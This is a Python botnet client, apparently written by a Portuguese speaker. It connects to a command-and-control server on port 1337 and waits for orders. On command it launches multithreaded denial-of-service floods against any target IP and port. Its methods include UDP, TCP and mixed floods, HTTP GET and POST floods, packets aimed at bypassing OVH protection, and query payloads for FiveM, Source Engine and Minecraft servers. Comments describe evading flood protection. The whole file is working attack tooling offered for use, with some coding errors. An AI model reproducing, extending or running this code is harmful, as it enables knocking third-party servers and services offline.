import subprocess, random, os, time, threading, socket, sys
from binascii import unhexlify

# Configuration
C2_ADDRESS  = ""
C2_PORT     = 1337

# Attack list
user_attacks = {}

# Payload para FiveM (servidores de GTA V)
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
# Payload para VSE (servidores diversos)
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
# Payload para MCPE (Minecraft PE)
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
# Payload HEXadecimal
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'

hex = [2, 4, 8, 16, 32, 64, 128]

PACKET_SIZES = [1024, 2048]


base_user_agents = [
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Windows; U; Windows NT {random.choice(['5.1', '6.1', '10.0'])}; en-US; rv:{random.uniform(5.0, 10.0):.1f}.{random.randint(0, 9)}) Gecko/{random.randint(2000, 2025)}{random.randint(10, 99)} Firefox/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Windows; U; Windows NT {random.choice(['5.1', '6.1', '10.0'])}; en-US; rv:{random.uniform(5.0, 10.0):.1f}.{random.randint(0, 9)}) Gecko/{random.randint(2000, 2025)}{random.randint(10, 99)} Chrome/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/{random.uniform(500.0, 600.0):.1f}.{random.randint(0,9)} (KHTML, like Gecko) Version/{random.randint(7, 15)}.0.{random.randint(1, 9)} Safari/{random.uniform(500.0, 600.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/{random.uniform(500.0, 600.0):.1f}.{random.randint(0,9)} (KHTML, like Gecko) Version/{random.randint(7, 15)}.0.{random.randint(1, 9)} Chrome/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/{random.uniform(500.0, 600.0):.1f}.{random.randint(0,9)} (KHTML, like Gecko) Version/{random.randint(7, 15)}.0.{random.randint(1, 9)} Firefox/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
]
def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        return result.decode().strip()
    except Exception as e:
        print(f"\nErro ao obter arquitetura: {e}\n")
        return 'unknown'


def generate_end(length=4, chara='\n\r'):
  d = ''.join(random.choice(chara) for _ in range(length))
  return d

def OVH_BUILDER(ip, port):
    packet_list = []
    for h2 in hex:
        for h in hex:
            random_part = "".join(random.choice(
                "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09"
                "\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13"
                "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d"
                "\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
                "\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31"
                "\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b"
                "\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45"
                "\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
                "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"
                "\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63"
                "\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d"
                "\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77"
                "\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
                "\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b"
                "\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95"
                "\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
                "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
                "\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3"
                "\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd"
                "\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7"
                "\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
                "\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb"
                "\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5"
                "\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
                "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9"
                "\xfa\xfb\xfc\xfd\xfe\xff"
            ) for _ in range(2048))
            
            paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\']
            for p in paths:
                end = generate_end()
                packet = (
                    f'PGET {p}{random_part} HTTP/1.1\n'
                    f'Host: {ip}:{port}{end}'
                )
                packet_list.append(packet.encode())
    return packet_list

def attack_ovh_tcp(ip, port, secs, stop_event):
  while time.time() < secs:
    if stop_event.is_set():
        break
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s2 = socket.create_connection((ip,port))
        s.connect((ip,port))
        s.connect_ex((ip,port))
        packet = OVH_BUILDER(ip, port)
        for a in packet:
            a = a.encode()
            for _ in range(10):
                s.send(a)
                s.sendall(a)
                s2.send(a)
                s2.sendall(a)
    except:
        pass

def attack_ovh_udp(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            packet = OVH_BUILDER(ip, port)
            for a in packet:
                a = a.encode()
                for _ in range(10):
                    s.sendto(a,(ip,port))
        except:
            pass


def attack_fivem(ip, port, secs, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_fivem, (ip, port))
    except:
        pass


def attack_mcpe(ip, port, secs, stop_event):
    """Testado em Realms Servers"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_mcpe, (ip, port))
    except:
        pass


def attack_vse(ip, port, secs, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_vse, (ip, port))
    except:
        pass


def attack_hex(ip, port, secs, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_hex, (ip, port))
    except:
        pass


def attack_udp_bypass(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet_size = random.choice(PACKET_SIZES) 
            packet = random._urandom(packet_size)
            sock.sendto(packet, (ip, port))
    except:
        pass



def attack_tcp_bypass(ip, port, secs, stop_event):
    """Tenta contornar proteção adicionando pacotes com tamanhos diferentes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet_size = random.choice(PACKET_SIZES) 
            packet = random._urandom(packet_size)

            try:
                s.connect((ip, port))
                while time.time() < secs:
                    s.send(packet)
            except Exception as e:
                pass
            finally:
                s.close()    
    except:
        pass


def attack_tcp_udp_bypass(ip, port, secs, stop_event):
    """Tenta contornar proteção variando protocolo e adicionando pacotes com tamanhos diferentes."""
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            packet_size = random.choice(PACKET_SIZES)
            packet = random._urandom(packet_size)
            
            if random.choice([True, False]):  # Alterna entre TCP e UDP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
            while time.time() < secs:
                if s.type == socket.SOCK_STREAM:
                    s.send(packet)
                else:
                    s.sendto(packet, (ip, port))
        except Exception as e:
            pass
        finally:
            s.close()


def attack_syn(ip, port, secs, stop_event):
    """Melhorado para contornar proteções simples de SYN flood com variação de pacotes."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    
    try:
        s.connect((ip, port))
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet_size = random.choice(PACKET_SIZES)
            packet = os.urandom(packet_size)
    
            s.send(packet)
    except Exception as e:
        pass


def attack_http_get(ip, port, secs, stop_event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()


def attack_http_post(ip, port, secs, stop_event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s.connect((ip, port))
            while time.time() < secs:
                payload = '757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
                headers = (f'POST / HTTP/1.1\r\n'
                           f'Host: {ip}\r\n'
                           f'User-Agent: {rand_ua()}\r\n'
                           f'Content-Type: application/x-www-form-urlencoded\r\n'
                           f'Content-Length: {len(payload)}\r\n'
                           f'Connection: keep-alive\r\n\r\n'
                           f'{payload}')
                s.send(headers.encode())
        except:
            s.close()


def attack_browser(ip, port, secs, stop_event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s.connect((ip, port))
            request = (f'GET / HTTP/1.1\r\n'
                       f'Host: {ip}\r\n'
                       f'User-Agent: {rand_ua()}\r\n'
                       f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
                       f'Accept-Encoding: gzip, deflate, br\r\n'
                       f'Accept-Language: en-US,en;q=0.5\r\n'
                       f'Connection: keep-alive\r\n'
                       f'Upgrade-Insecure-Requests: 1\r\n'
                       f'Cache-Control: max-age=0\r\n'
                       f'Pragma: no-cache\r\n\r\n')
            
            s.sendall(request.encode())
            
        except Exception as e:
            pass
        finally:
            s.close()


def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        '.HEX': attack_hex,
        '.UDP': attack_udp_bypass,
        '.TCP': attack_tcp_bypass,
        '.MIX': attack_tcp_udp_bypass,
        '.SYN': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.HTTPGET': attack_http_get,
        '.HTTPPOST': attack_http_post,
        '.BROWSER': attack_browser,
        '.OVHTCP': attack_ovh_tcp,
        '.OVHUDP': attack_ovh_udp
    }
    methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration

    for _ in range(thread_count):
        t = threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True)
        t.start()

        if username not in user_attacks:
            user_attacks[username] = []
        user_attacks[username].append((t, stop_event))

def stop_attacks(username):
    if username in user_attacks:
        for t, stop_event in user_attacks[username]:
            stop_event.set()
        user_attacks[username].clear()
    else:
        pass


def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send(get_architecture().encode())
                    break

            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            
            print('connected!')
            break
        except:
            time.sleep(120)

    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].upper()

            if command == 'PING':
                c2.send('PONG'.encode())

            elif command == 'STOP' and len(args) > 1:
                username = args[1]
                stop_attacks(username)

            else:
                method = command
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                username = args[5] if len(args) >= 6 else "default"

                start_attack(method, ip, port, secs, threads, username)
        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass
